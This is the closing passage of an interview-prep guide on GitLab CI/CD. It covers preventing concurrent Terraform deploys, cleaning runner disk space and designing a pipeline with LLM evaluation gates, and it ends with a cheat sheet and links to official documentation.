- *What is `concurrent` in runner config?* The maximum number of jobs a runner process runs at once across all its registered runners.

---

### Q56. Two pipelines deployed at once and corrupted the Terraform state or ECS service. How do you prevent it?

**Short answer:** Add a **`resource_group` per environment** so deploy and apply jobs run one at a time across pipelines, keep **Terraform state locking** on, make deploy jobs **non-interruptible**, and make deploy steps **idempotent** (safe to re-run). To recover, confirm nothing is still running before releasing any lock, then reconcile state with reality.

**Steps:**
1. **Confirm the overlap:** two deploy jobs to `production` with overlapping start and end times in the environment's deployment list.
2. **Check state locking:** an S3 backend without `use_lockfile` (or the older DynamoDB table) has no lock, so two applies can write state concurrently.
3. **Recover:** wait until both jobs have finished; if a lock is stuck, verify no process holds it, then `terraform force-unlock <LOCK_ID>`. Run `terraform plan` to see drift between state and real resources, and fix by `import` or targeted changes. For ECS, check which task definition the service now runs and redeploy the intended digest.
4. **Prevent:** `resource_group: production` on deploy and apply jobs, `interruptible: false`, state locking enabled, and only one branch allowed to deploy to each environment.

**Example:**
```yaml
.deploy:
  resource_group: $CI_ENVIRONMENT_NAME
  interruptible: false

apply-prod:
  extends: .deploy
  environment: production
  script: terraform apply -input=false plan.tfplan
```

**Common mistake → fix:** `force-unlock` as soon as you see "Error acquiring the state lock". If another apply is genuinely running, you've just allowed two writers. Fix: check the lock's owner and whether that job is still running before unlocking.

**Interview answer:** "I'd put each environment's deploy and apply jobs in a resource group so only one runs at a time, enable state locking, mark deploys non-interruptible and make them idempotent. To recover, I wait until nothing is running, only then force-unlock if needed, run a plan to find drift and reconcile, and redeploy the intended artifact."

**Follow-ups:**
- *Why both `resource_group` and state locking?* Locking protects state from any client (laptops included); `resource_group` stops the pipeline from queuing doomed concurrent runs.

---

### Q57. Jobs fail with "no space left on device" or runners are slow. What do you do?

**Short answer:** On long-lived runners, Docker images, build caches, volumes and old build directories accumulate until the disk fills. Find what's using the space, clean it on a schedule, and prefer **ephemeral, autoscaled runners** that start from a clean disk. Also shrink what jobs produce: smaller base images, fewer and smaller artifacts.

**Steps to diagnose:**
1. On the runner host, `df -h` shows which filesystem is full.
2. `docker system df` shows space used by images, containers, local volumes and build cache, e.g. "Build Cache 48 GB".
3. Check runner build directories and cache folders for stale projects.
4. Check job logs for huge artifacts or caches (`node_modules` of several GB).

**Fix:**
- Scheduled cleanup: `docker system prune -af --filter "until=72h"` and `docker builder prune --filter until=72h`.
- Ephemeral runners (Docker Autoscaler or Kubernetes) that throw the disk away after each job or VM lifetime.
- Smaller images (`-slim`, multi-stage builds), shorter artifact expiry, cache only what speeds jobs up.

**Example:** a self-managed runner with a 100 GB disk fails on `docker build`: `docker system df` shows 52 GB of build cache and 38 GB of dangling images. Pruning anything older than 3 days frees 80 GB; a nightly prune keeps it there.

**Common mistake → fix:** `docker system prune -af --volumes` during working hours on a runner that's running jobs; it deletes volumes and images that active jobs are using, failing them. Fix: run cleanup when idle (or let the runner's own cleanup handle it), and move to ephemeral runners.

**Interview answer:** "I check df and docker system df on the runner to see whether images, build cache or build directories are the problem, schedule pruning with an age filter, and ideally move to ephemeral autoscaled runners so every job starts on a clean disk. Then I reduce what jobs create: slimmer images, shorter artifact expiry and focused caches."

**Follow-ups:**
- *Does GitLab clean runner caches?* The runner has cache cleanup tooling for its volumes, but image and build-cache pruning on the host is your responsibility.

---

### Q58. Design a CI/CD pipeline for an AI service (FastAPI + LLM agent)

**Short answer:** Same principles as any service (fast checks first, build once, promote one digest, gated production) plus AI-specific gates: **unit tests with a fake LLM** for speed and determinism, an **evaluation suite** with quality, cost and latency budgets on a golden dataset, and prompts, model IDs and tool schemas **versioned with the code** so a prompt change goes through the same pipeline.

**How it works:**

```flow
pipeline: Pipeline for a FastAPI and LLM agent service
stage: Merge request pipeline
Lint and type check > ruff and mypy give feedback within 2 minutes.
Unit tests with a fake LLM > Deterministic and fast. No model calls, no cost.
Security scans > SAST, secret detection and dependency scanning run in parallel.
Build image and scan it > Tagged with the commit SHA, then container scanning and an SBOM.
Evaluation suite > A golden set of 200 questions must score at least 0.85, cost under a budget per run, and keep p95 latency under 4 seconds.
Terraform plan > Read-only role, policy checks, plan shown in the merge request.
stage: Main branch pipeline
Push and sign the image > The digest is exported for every later deploy job.
Deploy dev, then smoke tests > Automatic.
Deploy staging, then evals and load test > Real model endpoints and production-like data volumes.
Deploy production > Manual, protected environment, resource_group, canary with automatic rollback on alarms.
```

**Example (evaluation gate):**
```yaml
llm-evals:
  stage: test
  needs: [build-image]
  image: $CI_REGISTRY_IMAGE/api@$IMAGE_DIGEST
  script:
    - python -m evals.run --dataset evals/golden.jsonl --min-score 0.85 --max-cost-usd 3 --max-p95-ms 4000
  artifacts:
    when: always
    paths: [eval-report.html]
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes: [app/**/*, prompts/**/*, evals/**/*]
```

**What happens, step by step:**
1. An MR changes `prompts/triage.md`. Lint and unit tests pass in 3 minutes.
2. Because `prompts/**` changed, `llm-evals` runs inside the built image: score 0.81 (below 0.85). The job fails and `eval-report.html` shows which 12 questions regressed.
3. The author adjusts the prompt; the next run scores 0.88 at $2.10 per run (illustrative) with p95 3.2 s. The MR merges.
4. `main` builds once, deploys the same digest to dev and staging (evals again against real endpoints), and production is a manual, canary deploy with alarm-based rollback.

**Common mistake → fix:** calling the real LLM in every unit test. Tests become slow, expensive and non-deterministic (flaky). Fix: fake the model in unit tests and run real-model evaluations as a separate, path-filtered job with explicit budgets.

**Interview answer:** "Fast deterministic checks first with a fake LLM, security scans, build and scan the image, then an evaluation suite with quality, cost and latency thresholds that runs when prompts or agent code change. On main, build once, sign, and promote the same digest through dev and staging with smoke tests, evals and load tests, then a gated canary to production with automatic rollback. Credentials come from OIDC per environment, and prompts and model IDs are versioned with the code."

**Follow-ups:**
- *How do you keep eval costs down?* Run the full suite on prompt and agent changes and nightly; run a small smoke subset on other MRs; cache model responses for unchanged cases.

---

## 10. Cheat sheet

| Concept | Remember |
|---|---|
| Commit / branch / HEAD | snapshot with parent / movable pointer / "you are here" |
| fetch vs pull vs push | download only / download + integrate / upload (triggers CI) |
| Merge vs rebase vs squash | keep history / linear, new IDs, private branches only / one commit per MR |
| Undo on shared branch | `git revert`; `reflog` rescues lost commits |
| Leaked secret | rotate first; history rewrite is optional cleanup |
| Pipeline / stage / job | one run / ordered group / unit of work |
| Runner / executor | agent that runs jobs / how it isolates them; jobs pick runners by tags |
| Job pass/fail | first non-zero exit code fails; `set -o pipefail`; `after_script` can't fail the job |
| Artifacts vs cache | outputs within a pipeline (reliable) vs speed-up across pipelines (best effort) |
| Variable precedence | pipeline/manual → project → group → instance → YAML → predefined |
| Secrets | masked + hidden + protected + env-scoped; better: OIDC and runtime fetch |
| `rules` / `workflow:rules` | is this job added / is a pipeline created; first match wins |
| Duplicate pipelines | `workflow:rules` with `$CI_OPEN_MERGE_REQUESTS` → `when: never` |
| `needs` | DAG: start when listed jobs finish; `needs: []` starts immediately |
| `parallel` / `matrix` | N copies with `CI_NODE_INDEX` / one job per variable combination; max 200 |
| Manual gates | `when: manual` + protected environment + approvals |
| `resource_group` | one job at a time per group, across pipelines |
| `interruptible` | safe to auto-cancel; never on deploys |
| Downstream pipelines | `trigger:include` (child) / `trigger:project`; `strategy: mirror` |
| `retry` | max 2; only infrastructure failure reasons |
| Reuse | `include` (pinned), `extends`, `!reference`, components with typed inputs |
| Environments | deployment history, URL, protection, rollback; review apps with `on_stop` |
| OIDC to AWS | `id_tokens` → `AssumeRoleWithWebIdentity`; trust policy pins `sub` |
| Images | tag with commit SHA, deploy by digest, rootless builds |
| Terraform | plan in MR (read-only), apply saved plan on main (manual, locked) |
| Promotion | build once, deploy the same digest everywhere |
| Supply chain | pin, scan, SBOM, sign keylessly, verify before deploy |
| Pending job | no matching runner: tags, protected runner, offline, capacity |

## Official references

- Git documentation: https://git-scm.com/doc · Pro Git book: https://git-scm.com/book
- GitLab CI/CD: https://docs.gitlab.com/ci/ · YAML reference: https://docs.gitlab.com/ci/yaml/
- Jobs and rules: https://docs.gitlab.com/ci/jobs/job_rules/ · Variables: https://docs.gitlab.com/ci/variables/
- Pipelines (MR, merged results, merge trains): https://docs.gitlab.com/ci/pipelines/
- Caching and artifacts: https://docs.gitlab.com/ci/caching/ · https://docs.gitlab.com/ci/jobs/job_artifacts/
- Resource groups: https://docs.gitlab.com/ci/resource_groups/
- Components and inputs: https://docs.gitlab.com/ci/components/ · https://docs.gitlab.com/ci/inputs/
- Environments: https://docs.gitlab.com/ci/environments/
- OIDC with AWS: https://docs.gitlab.com/ci/cloud_services/aws/
- GitLab Runner executors: https://docs.gitlab.com/runner/executors/
- Application security: https://docs.gitlab.com/user/application_security/
